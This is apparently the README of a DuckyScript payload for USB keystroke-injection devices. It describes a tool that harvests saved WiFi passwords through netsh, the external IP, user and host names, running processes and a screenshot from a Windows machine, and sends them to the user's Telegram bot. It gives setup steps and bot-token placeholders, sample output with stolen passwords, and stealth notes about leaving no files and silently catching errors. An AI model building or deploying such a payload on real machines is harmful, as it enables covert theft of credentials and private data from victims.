# Telegram Exfil - WiFi, System Info & Screenshot

## Description

Self-contained Windows payload that exfiltrates data to your Telegram bot. No external scripts or resources needed — everything is embedded in the DuckyScript.

## What It Grabs

| Data | Method |
|------|--------|
| **WiFi passwords** | `netsh wlan show profiles` + `key=clear` |
| **External IP** | `ifconfig.me` |
| **User & hostname** | `$env:USERNAME@$env:COMPUTERNAME` |
| **OS version** | WMI query |
| **Top 10 processes** | CPU-sorted process list |
| **Screenshot** | `Graphics.CopyFromScreen` → Telegram document |

All data is sent as Telegram messages except the screenshot which is uploaded as a file.

## Setup

1. **Create Telegram bot** — talk to `@BotFather`, get your bot token
2. **Get Chat ID** — message your bot, then visit `https://api.telegram.org/bot<TOKEN>/getUpdates`
3. **Edit DEFINEs** in `payload.txt`:

```
DEFINE #BOT_TOKEN 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
DEFINE #CHAT_ID 987654321
```

4. **Compile** with PayloadStudio, copy `inject.bin` to Ducky SD card

## Example Output

```
=== EXFIL START ===
User: jdoe@DESKTOP-ABC123 | OS: Microsoft Windows 11 Pro
--- WiFi ---
Office-Guest | Summer2024!
Home-5G | passw0rd123
Starbucks_WiFi | (no pass)
--- IP ---
203.0.113.42
--- Processes Top 10 ---
{"Name":  "chrome",  "CPU(s)":  142.5}
{"Name":  "Teams",  "CPU(s)":  89.2}
...
--- Screenshot ---
[file: exfil.jpg uploaded]
=== EXFIL COMPLETE ===
```

## Notes

- Screenshot requires STA — may fail on some Windows configurations (PowerShell MTA limitation)
- WiFi SSIDs with special characters in name are handled correctly via quoted parameter
- No files are left on disk after execution (temp screenshot is cleaned up)
- All errors are silently caught — the payload won't crash mid-execution
